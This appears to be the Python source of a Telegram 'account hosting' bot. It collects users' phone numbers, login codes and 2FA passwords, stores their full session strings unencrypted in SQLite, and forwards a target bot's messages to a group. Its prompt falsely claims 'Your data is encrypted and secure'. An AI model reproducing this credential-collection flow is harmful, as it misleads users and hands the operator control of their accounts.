import os
import asyncio
import sqlite3
import logging
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965")) 
API_ID = int(os.environ.get("API_ID", "38746329"))
API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
PORT = int(os.environ.get("PORT", 10000))

(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_WELCOME_IMG, ASK_DEV_USER, ASK_TARGET_BOT, ASK_TARGET_GROUP) = range(7)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONT ==================
def st(text: str) -> str:
    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
    out = []
    for ch in text:
        if ch in upper: out.append(upper[ch])
        elif ch in lower: out.append(lower[ch])
        elif ch in digits: out.append(digits[ch])
        else: out.append(ch)
    return "".join(out)

# ================== FLASK PORT SERVER ==================
flask_app = Flask(__name__)
@flask_app.route('/')
def health(): return "Bot is running!", 200
def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)

# ================== DATABASE ==================
def init_db():
    conn = sqlite3.connect("bot_data.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS accounts (user_id INTEGER PRIMARY KEY, phone TEXT, session TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
    conn.commit(); conn.close()
init_db()

def get_setting(key, default=None):
    conn = sqlite3.connect("bot_data.db")
    c = conn.cursor(); c.execute("SELECT value FROM settings WHERE key=?", (key,))
    row = c.fetchone(); conn.close()
    return row[0] if row else default

def set_setting(key, value):
    conn = sqlite3.connect("bot_data.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", (key, str(value)))
    conn.commit(); conn.close()

def db_execute(query, params=()):
    conn = sqlite3.connect("bot_data.db")
    c = conn.cursor(); c.execute(query, params)
    conn.commit(); res = c.fetchall(); conn.close()
    return res

# ================== USERBOT (Message Forwarder) ==================
userbot_clients = {} 

async def start_userbot(user_id, phone, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        
        @client.on(events.NewMessage)
        async def msg_handler(event):
            target_bot = get_setting("target_bot")
            target_group = get_setting("target_group")
            
            if not target_bot or not target_group:
                return
            
            sender = await event.get_sender()
            if sender and sender.username and sender.username.lower() == target_bot.lower():
                try:
                    await client.forward_messages(target_group, event.message)
                    logger.info(f"Message forwarded to {target_group}")
                except Exception as e:
                    logger.error(f"Failed to forward: {e}")
                    
        userbot_clients[user_id] = client
        return client
    except Exception as e:
        logger.error(f"Userbot start failed: {e}")
        return None

# ================== BOT HANDLERS ==================
bot_app = None 

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_img = get_setting("welcome_image")
    dev_user = get_setting("dev_username", "@iflexzyann")
    
    # CLEAN BUTTONS (No Emojis)
    kb = [
        [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc")],
        [InlineKeyboardButton(st("ADD BOT"), callback_data="add_bot")],
        [InlineKeyboardButton(st("SET GROUP"), callback_data="set_group")],
        [InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel")] if user.id == OWNER_ID else []
    ]
    kb = [row for row in kb if row]
    reply_markup = InlineKeyboardMarkup(kb)
    
    caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
    
    if welcome_img:
        try:
            await update.message.reply_photo(photo=welcome_img, caption=caption, reply_markup=reply_markup, parse_mode="HTML")
            return
        except: pass
        
    await update.message.reply_text(caption, reply_markup=reply_markup, parse_mode="HTML")

# --- ADD ACCOUNT ---
async def add_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    text = (
        f"╰_╯ <b>HOST NEW ACCOUNT</b>\n\n"
        f"<b>Secure Account Hosting</b>\n\n"
        f"Enter your phone number with country code:\n\n"
        f"<blockquote>Example: +1234567890</blockquote>\n\n"
        f"Your data is encrypted and secure"
    )
    kb = [[InlineKeyboardButton(st("BACK"), callback_data="back")]]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+"):
        return await update.message.reply_text(st("Please include country code (e.g. +91...)"))
        
    context.user_data['phone'] = phone
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        context.user_data['temp_client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        
        kb = [
            [InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
            [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
            [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
            [InlineKeyboardButton(st("CLEAR"), callback_data="otp_clear"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton(st("SUBMIT"), callback_data="otp_submit")]
        ]
        context.user_data['otp_entered'] = ""
        await update.message.reply_text(st("Enter the OTP:"), reply_markup=InlineKeyboardMarkup(kb))
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"{st('Error')}: {e}")
        return ConversationHandler.END

async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data.replace("otp_", "")
    otp = context.user_data.get('otp_entered', "")
    
    if data == "clear": otp = ""
    elif data == "submit":
        if len(otp) < 4: 
            await query.answer(st("Enter at least 4 digits!"))
            return ASK_OTP
        client = context.user_data['temp_client']
        try:
            await client.sign_in(phone=context.user_data['phone'], code=otp, phone_code_hash=context.user_data['phone_code_hash'])
            await save_login(update, context, client, context.user_data['phone'])
            return ConversationHandler.END
        except Exception as e:
            if "Two-step verification" in str(e) or "password" in str(e).lower():
                await query.edit_message_text(st("Enter your 2FA password:"))
                return ASK_2FA
            else:
                await query.edit_message_text(f"{st('Login failed')}: {e}")
                return ConversationHandler.END
    else:
        if len(otp) < 5: otp += data
        
    context.user_data['otp_entered'] = otp
    display = otp + "_" * (5 - len(otp))
    try: await query.edit_message_text(st(f"OTP: {display}"), reply_markup=query.message.reply_markup)
    except: pass
    return ASK_OTP

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.user_data['temp_client'].sign_in(password=update.message.text.strip())
        await save_login(update, context, context.user_data['temp_client'], context.user_data['phone'])
    except Exception as e:
        await update.message.reply_text(f"{st('2FA failed')}: {e}")
    return ConversationHandler.END

async def save_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client, phone):
    session_str = client.session.save()
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
    db_execute("INSERT OR REPLACE INTO accounts (user_id, phone, session) VALUES (?,?,?)", (user_id, phone, session_str))
    await start_userbot(user_id, phone, session_str)
    await bot_app.bot.send_message(chat_id=user_id, text=st("Account successfully logged in!"))
    await client.disconnect()

# --- ADD BOT (Target Bot Set) ---
async def add_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(st("Send the username of the bot whose messages you want to forward (without @):"))
    return ASK_TARGET_BOT

async def save_target_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip().replace("@", "")
    set_setting("target_bot", target)
    await update.message.reply_text(st(f"Target bot set to: @{target}"))
    return ConversationHandler.END

# --- SET GROUP (Target Group Set) ---
async def set_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(st("Send the group link or username (e.g. https://t.me/mygroup):"))
    return ASK_TARGET_GROUP

async def save_target_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    set_setting("target_group", target)
    await update.message.reply_text(st(f"Target group set to: {target}"))
    return ConversationHandler.END

# --- OWNER PANEL ---
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != OWNER_ID:
        return await query.answer(st("Access Denied!"))
    await query.answer()
    
    kb = [
        [InlineKeyboardButton(st("SET WELCOME IMAGE"), callback_data="set_welcome")],
        [InlineKeyboardButton(st("CHANGE DEVELOPER"), callback_data="set_dev")],
        [InlineKeyboardButton(st("BACK"), callback_data="back")]
    ]
    await query.edit_message_text(st("OWNER PANEL"), reply_markup=InlineKeyboardMarkup(kb))

async def ask_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(st("Send the photo you want as welcome image:"))
    return ASK_WELCOME_IMG

async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        set_setting("welcome_image", update.message.photo[-1].file_id)
        await update.message.reply_text(st("Welcome image set!"))
    return ConversationHandler.END

async def ask_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(st("Send new developer username:"))
    return ASK_DEV_USER

async def save_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_setting("dev_username", update.message.text.strip())
    await update.message.reply_text(st("Developer username updated!"))
    return ConversationHandler.END

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await start(update, context)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(st("Cancelled."))
    return ConversationHandler.END

# ================== MAIN ==================
def main():
    global bot_app
    threading.Thread(target=run_flask, daemon=True).start()
    bot_app = Application.builder().token(BOT_TOKEN).build()

    login_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_acc, pattern="^add_acc$")],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")],
            ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
    )

    bot_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_bot, pattern="^add_bot$")],
        states={ASK_TARGET_BOT: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_bot)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
    )

    group_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(set_group, pattern="^set_group$")],
        states={ASK_TARGET_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_group)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
    )

    owner_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(ask_welcome, pattern="^set_welcome$"),
            CallbackQueryHandler(ask_dev, pattern="^set_dev$")
        ],
        states={
            ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)],
            ASK_DEV_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_dev)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
    )

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(login_conv)
    bot_app.add_handler(bot_conv)
    bot_app.add_handler(group_conv)
    bot_app.add_handler(owner_conv)
    bot_app.add_handler(CallbackQueryHandler(owner_panel, pattern="^owner_panel$"))
    bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))

    logger.info("Bot started!")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
